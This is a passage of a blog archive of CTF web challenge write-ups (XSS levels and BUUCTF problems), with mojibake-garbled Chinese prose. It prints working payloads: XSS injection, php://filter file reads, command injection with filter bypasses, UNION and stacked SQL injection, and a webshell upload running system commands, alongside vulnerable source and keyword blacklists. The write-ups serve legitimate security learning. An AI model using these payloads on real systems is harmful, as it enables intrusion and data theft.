invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>); <span class="comment">//ç”¨å›è½¦æ¥å°†å®ƒä»¬åˆ†å¼€</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level17"><a href="#Level17" class="headerlink" title="Level17"></a>Level17</h2><h3 id="Payload-15"><a href="#Payload-15" class="headerlink" title="Payload"></a>Payload</h3><p>å¯ä»¥è¯•è¯•è°·æ­Œæµè§ˆå™¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level17.php?arg01=a&amp;arg02=123%20onmousedown=%27alert(1)%27</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-15"><a href="#æºç åˆ†æ-15" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><h3 id="Payload-16"><a href="#Payload-16" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level18.php?arg01=a&amp;arg02=123%20onmousedown=%27alert(1)%27</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-16"><a href="#æºç åˆ†æ-16" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf02.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level19"><a href="#Level19" class="headerlink" title="Level19"></a>Level19</h2><p>ç•¥</p><h2 id="Level20"><a href="#Level20" class="headerlink" title="Level20"></a>Level20</h2><p>ç•¥</p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf Web åˆ·é¢˜è®°å½• 1</title>
      <link href="/2022/06/23/buuctf-web1/"/>
      <url>/2022/06/23/buuctf-web1/</url>
      
        <content type="html"><![CDATA[<h1 id="buuctf-Web-åˆ·é¢˜è®°å½•-1"><a href="#buuctf-Web-åˆ·é¢˜è®°å½•-1" class="headerlink" title="buuctf Web åˆ·é¢˜è®°å½• 1"></a>buuctf Web åˆ·é¢˜è®°å½• 1</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.ghtwf01.cn/index.php/archives/303/">å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨åŠç»•è¿‡æ–¹å¼æ€»ç»“</a></p><p><a href="https://blog.csdn.net/weixin_45766049/article/details/117487209">SSTIæ¨¡ç‰ˆæ³¨å…¥</a></p><p><a href="https://cizixs.com/2017/03/08/flask-insight-session/">flask æºç è§£æï¼šsession</a></p><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">å®¢æˆ·ç«¯ session å¯¼è‡´çš„å®‰å…¨é—®é¢˜</a></p><p><a href="https://blog.csdn.net/iczfy585/article/details/106081299">PHPä¸­MD5å¸¸è§ç»•è¿‡</a></p></blockquote><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p>ç‚¹å‡»<code>hint</code>åå‘ç°åœ°å€æ å¤„æœ‰<code>file=flag.php</code>ï¼Œæ•…æ„é€ payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://ae8bac3b-f39b-4695-b09d-2906050c1289.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag.phpçš„base64ç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ZTIyMWQyMzQtYThjNi00NzMyLTg2YzQtZWQzMTMxMzJlZGM0fQo=</span><br></pre></td></tr></table></figure><p>è§£ç å³å¯å¾—åˆ°flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;e221d234-a8c6-4732-86c4-ed313132edc4&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><p>å°è¯•å‘½ä»¤<code>127.0.0.1|ls</code>å‘ç°å¯ä»¥æ‰§è¡Œï¼Œäºæ˜¯æ„é€ payloadä¸º<code>127.0.0.1|cat ../../../flag</code>å³å¯</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><h3 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h3><p>å †å æ³¨å…¥è·å–ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show databases; #çˆ†å‡ºæ•°æ®åº“</span><br><span class="line">1;show tables;  #çˆ†å‡ºè¡¨å</span><br><span class="line">1;show columns from Flag#å‘ç°è¢«è¿‡æ»¤ç”¨ä¸äº†</span><br></pre></td></tr></table></figure><p>å› ä¸ºå›æ˜¾æ˜¯<code>var_dump</code>æ ·å¼ï¼Œå½“æŸ¥è¯¢è¯­å¥ä¸ºçº¯æ•°å­—çš„æ—¶å€™æ‰å›æ˜¾ï¼Œä½¿ç”¨<code>1,2,3,4,5</code>è¿›è¡Œæµ‹è¯•å‘ç°åŸæœ¬æŸ¥è¯¢å”¯ç‹¬æœ«å°¾çš„5å˜ä¸ºäº†1ï¼ŒçŒœæµ‹æ˜¯ç”¨åˆ°äº†ç®¡é“ç¬¦ï¼ˆ| ||ä¹‹ç±»çš„ï¼‰ï¼Œå¯¼è‡´5å›æ˜¾å¤±è´¥ã€‚æ•…ä½¿ç”¨<code>1</code>ä½¿å¾—<code>|</code>æˆ–è€…æ˜¯<code>||</code>å¤±æ•ˆå³å¯ã€‚</p><p><img src="https://img.gejiba.com/images/e8e16f43c6ceb4f04afd49158db5317a.png" alt="e8e16f43c6ceb4f04afd49158db5317a.png"></p><h3 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h3><p>ä¼ å…¥<code>99;set sql_mode=PIPES_AS_CONCAT;select 0</code>ä½¿å¾—<code>||</code>ä½œä¸ºå­—ç¬¦æ“ä½œç¬¦è€Œä¸æ˜¯æ‰§è¡Œæˆ–è¿ç®—ã€‚</p><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$post</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$get</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$MysqlLink</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    <span class="variable">$MysqlLink</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="variable">$datauser</span>,<span class="variable">$datapass</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$MysqlLink</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Mysql Connect Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$selectDB</span> = <span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$MysqlLink</span>,<span class="variable">$dataName</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$selectDB</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Choose Database Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$v</span>)&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$v</span>))&#123;</span><br><span class="line">            <span class="variable">$post</span>[<span class="variable">$k</span>] = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;query&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$BlackList</span> = <span class="string">&quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile</span></span><br><span class="line"><span class="string">        |readfile|where|from|union|update|delete|if|sleep|extractvalue|</span></span><br><span class="line"><span class="string">        updatexml|or|and|&amp;|\&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;]));</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">&#123;$BlackList&#125;</span>/is&quot;</span>,<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post[&#x27;query&#x27;];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Nonono.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Too long.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select &quot;</span>.<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>].<span class="string">&quot;||flag from Flag&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$MysqlLink</span>))&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$res</span>))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@<span class="title function_ invoke__">mysqli_next_result</span>(<span class="variable">$MysqlLink</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p>æŸ¥çœ‹æºç å‘ç°<code>Archive_room.php</code>ï¼Œç´§æ¥ç€ç‚¹å‡»è¿›å…¥<code>action.php</code>ï¼Œå‘ç°ä¼šè‡ªåŠ¨è·³è½¬åˆ°<code>end.php</code>ï¼Œæ•…ä½¿ç”¨burpæŠ“åŒ…å¯ä»¥å¾—åˆ°<code>  secr3t.php</code>ï¼Œè®¿é—®åå¾—åˆ°æºç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è®¿é—®æ— æ³•è¯»å–å†…å®¹ï¼Œæ•…ä»¥base64ç¼–ç æ–¹å¼è¯»å–æºç ï¼Œè§£ç åå¾—åˆ°flagã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://f3925568-2385-4077-988b-ba86518a9ac0.node4.buuoj.cn:81/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>ä½¿ç”¨<code>?ip=1|ls</code>æŸ¥çœ‹ç›®å½•ä¸‹æ–‡ä»¶ï¼Œç„¶åç”¨<code>?ip=1|cat$IFS$1index.php</code>å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payloadæ‰§è¡ŒåæŸ¥çœ‹æºç å³å¯å¾—åˆ°flagã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#base64ç¼–ç </span></span><br><span class="line">http://edccc6cc-6b6c-4081-aae7-638533e910d7.node4.buuoj.cn:81/?ip=1|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|<span class="attribute">sh</span></span><br><span class="line"><span class="comment">#æ‹¼æ¥ç»•è¿‡re</span></span><br><span class="line">http://edccc6cc-6b6c-4081-aae7-638533e910d7.node4.buuoj.cn:81/?ip=1;i=g;cat$IFS$1fla$i.php</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p>F12å®¡è®¡ä»£ç å‘ç°æ˜¯é€šè¿‡<code>check.php</code>éªŒè¯getè¯·æ±‚ï¼Œå°è¯•åå‘ç°ç”¨æˆ·åä½¿ç”¨äº†<code>&#39;&#39;</code>ä¸”å¯†ç ä½¿ç”¨äº†<code>&quot;&quot;</code>å¤„ç†ï¼Œå°è¯•ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#çˆ†å‡ºå¯†ç 9fa5459ff2ff5f4584bd0f2a58c5e67</span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=admin&#x27; or &#x27;1=1&amp;password=admin</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºå¯†ç åå°è¯•md5è§£å¯†å‘ç°ä¸å¯¹ï¼Œç»§ç»­sqlæ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å‘ç°æœ‰3ä¸ªå­—æ®µ</span></span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=admin&#x27; <span class="attribute">order</span> by <span class="number">4</span>%<span class="number">23</span>&amp;password=admin</span><br><span class="line"><span class="comment">#æŸ¥çœ‹æ•°æ®åº“å’Œç‰ˆæœ¬(geek,10.3.18-MariaDB)</span></span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=-1&#x27; union <span class="literal">select</span> <span class="number">1</span>,database(),version()%<span class="number">23</span>&amp;password=admin</span><br><span class="line"><span class="comment">#çˆ†è¡¨(geekuser,l0ve1ysq1)</span></span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=-1&#x27; union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;geek&#x27;</span>%<span class="number">23</span>&amp;password=admin</span><br><span class="line"><span class="comment">#çˆ†åˆ—(id,username,password)</span></span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=-1&#x27; union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;l0ve1ysq1&#x27;</span>%<span class="number">23</span>&amp;password=admin</span><br><span class="line"><span class="comment">#çˆ†å¯†ç è·å¾—flag</span></span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=-1&#x27; union <span class="literal">select</span> <span class="number">1</span>,group_concat(password),<span class="number">3</span> from l0ve1ysq1%<span class="number">23</span>&amp;password=admin</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><p>èšå‰‘ç›´æ¥è¿ï¼Œå¯†ç æ˜¯<code>Syc</code></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>F12å‘ç°å­˜åœ¨<code>Secret.php</code></p><p>è®¿é—®åå‘ç°<code>It doesn&#39;t come from &#39;https://Sycsecret.buuoj.cn&#39;</code>ï¼Œæ•…ç”¨burpæŠ“åŒ…ä¿®æ”¹<code>Referer</code></p><p>å‘ç°æç¤ºè¦ä½¿ç”¨<code>Syclover browser</code>ï¼Œæ•…ä¿®æ”¹<code>User-Agent</code> </p><p>å‘ç°è¦ä»æœ¬åœ°è®¿é—®ï¼Œæ•…ä¿®æ”¹<code>X-Forwarded-For:</code>ï¼Œæœ€ç»ˆå¾—åˆ°flag</p><p><img src="https://img.gejiba.com/images/24b3af12dcc7500fb4cf10f9d59afa95.png" alt="24b3af12dcc7500fb4cf10f9d59afa95.png"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>è®¿é—®<code>http://0ff1b314-797b-4c30-87dd-a290016743a5.node4.buuoj.cn:81/upload/</code>å³å¯çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå‘ç°å…¶ä¸­æœ‰<code>.phtml</code>åç¼€çš„æ–‡ä»¶ï¼Œæ•…æŠ“åŒ…ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://img.gejiba.com/images/60a06a2b61e800d1e7cf350579dd6c2c.png" alt="60a06a2b61e800d1e7cf350579dd6c2c.png"></p><p>ä¸Šä¼ åpostä¼ è¾“<code>attack=system(&#39;cat /flag&#39;);</code>å³å¯ã€‚</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>é»‘åå•è¿‡æ»¤ï¼ŒæŠ“åŒ…ä¿®æ”¹åç¼€ä¸º<code>.phtml</code>å³å¯</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p>è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ï¼Œé‡‡ç”¨åŒå†™ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŸ¥çœ‹å½“å‰åº“</span><br><span class="line">http://f2e0cf42-dbf4-456f-a911-f361f830440d.node4.buuoj.cn:81/check.php?username=1&amp;password=1&#x27;ununionion seselectlect 1,2,database()%23</span><br><span class="line">#çˆ†åº“ ctf</span><br><span class="line">http://f2e0cf42-dbf4-456f-a911-f361f830440d.node4.buuoj.cn:81/check.php?username=1&amp;password=1&#x27;ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23</span><br><span class="line">#çˆ†è¡¨ Flag</span><br><span class="line">http://f2e0cf42-dbf4-456f-a911-f361f830440d.node4.buuoj.cn:81/check.php?username=1&amp;password=1&#x27;ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;ctf&#x27;%23</span><br><span class="line">#çˆ†åˆ— flag</span><br><span class="line">http://f2e0cf42-dbf4-456f-a911-f361f830440d.node4.buuoj.cn:81/check.php?username=1&amp;password=1&#x27;ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;Flag&#x27;%23</span><br><span class="line">#çˆ†å†…å®¹</span><br><span class="line">http://f2e0cf42-dbf4-456f-a911-f361f830440d.node4.buuoj.cn:81/check.php?username=1&amp;password=1&#x27;ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag%23</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>è®¿é—®<code>calc.php</code>å¯ä»¥çœ‹åˆ°éƒ¨åˆ†æºç ï¼Œåˆ©ç”¨numè¿›è¡Œä¼ å‚ï¼Œåœ¨numå‰æ·»åŠ ç©ºæ ¼å¯ä»¥ç»•è¿‡æ³¨é‡Šæ‰€è¯´çš„waf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#åˆ—å‡ºæ–‡ä»¶ var_dump(scandir(/))</span><br><span class="line">http://node4.buuoj.cn:28694/calc.php? num=var_dump(scandir(chr(47)))</span><br><span class="line"></span><br><span class="line">#è¯»å–flag file_get_contents(/f1agg)</span><br><span class="line">http://node4.buuoj.cn:28694/calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure><blockquote><p><code>scandir()</code>è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„<br><code>scandir(/)</code>ç›¸å½“äº<code>ls /</code><br><code>var_dump()</code>ç›¸å½“äº<code>echo</code></p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>è®¿é—®<code>www.zip</code>è·å–å¤‡ä»½æ–‡ä»¶ï¼Œ<code>index.php</code>ä¸­æœ‰å¦‚ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span 